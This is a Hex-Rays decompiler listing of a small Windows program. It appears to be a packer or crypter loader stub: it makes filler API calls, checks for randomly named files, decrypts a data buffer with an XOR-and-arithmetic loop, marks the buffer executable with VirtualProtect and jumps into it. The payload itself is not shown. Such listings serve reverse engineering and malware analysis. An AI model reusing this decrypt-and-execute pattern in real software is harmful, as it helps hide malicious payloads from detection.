/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __usercall start@<eax>(int a1@<edi>);
void __stdcall sub_428538(_DWORD *a1, unsigned int a2, int a3);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// LPWSTR __stdcall GetCommandLineW();
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetCurrentThreadId();
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// UINT __stdcall GetOEMCP();
// DWORD __stdcall GetCurrentProcessId();
// NTSTATUS __stdcall ZwFindAtom(PWSTR AtomName, ULONG AtomNameLength, PRTL_ATOM Atom);

//-------------------------------------------------------------------------
// Data declarations

CHAR FileName[] = "0aerXZgMOkOAeRL.nWT"; // idb
CHAR aMxostjvex7b2rf[] = "MxOsTjVeX7B2rF1.Ivo"; // idb
_DWORD dword_533058[9] =
{
  1916788610,
  -1013046242,
  2137084372,
  1480036439,
  1831305179,
  1209449810,
  -772820649,
  871389825,
  -1688783643
}; // idb


//----- (00428387) --------------------------------------------------------
int __usercall start@<eax>(int a1@<edi>)
{
  WCHAR *v2; // [esp-Ch] [ebp-24h]
  ULONG v3; // [esp-8h] [ebp-20h]
  USHORT *v4; // [esp-4h] [ebp-1Ch]
  int v5; // [esp-4h] [ebp-1Ch]
  DWORD flOldProtect[3]; // [esp+Ch] [ebp-Ch] BYREF

  GetCommandLineW();
  v4 = 0;
  v3 = 0;
  GetCurrentThreadId();
  GetCurrentProcessId();
  v2 = 0;
  do
  {
    GetCurrentThreadId();
    v5 = ZwFindAtom(v2, v3, v4);
    GetCurrentThreadId();
    GetCurrentThreadId();
    sub_428538(dword_533058, 0x710Bu, v5);
  }
  while ( CreateFileA(FileName, 0xA0000000, 4u, 0, 3u, 0x102u, 0) != (HANDLE)-1 );
  GetOEMCP();
  GetCurrentProcessId();
  flOldProtect[2] = (DWORD)GetCommandLineA();
  flOldProtect[1] = (DWORD)CreateFileA(aMxostjvex7b2rf, 0x80000000, 2u, 0, 3u, 0x123u, 0);
  GetOEMCP();
  VirtualProtect(dword_533058, 0x710Bu, 0x40u, flOldProtect);
  GetCurrentThreadId();
  GetOEMCP();
  return MK_FP(*(_WORD *)(a1 + 4), *(_DWORD *)a1)();
}
// 4283AB: variable 'v2' is possibly undefined
// 4283AB: variable 'v3' is possibly undefined
// 4283AB: variable 'v4' is possibly undefined

//----- (00428538) --------------------------------------------------------
void __stdcall sub_428538(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // edx

  v4 = a2 >> 2;
  do
  {
    *a1 ^= a3;
    *a1 = -*a1;
    *a1 ^= a3;
    *a1 -= a3;
    *a1 -= 1740755;
    *a1++ += a3;
    --v4;
  }
  while ( v4 );
}

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
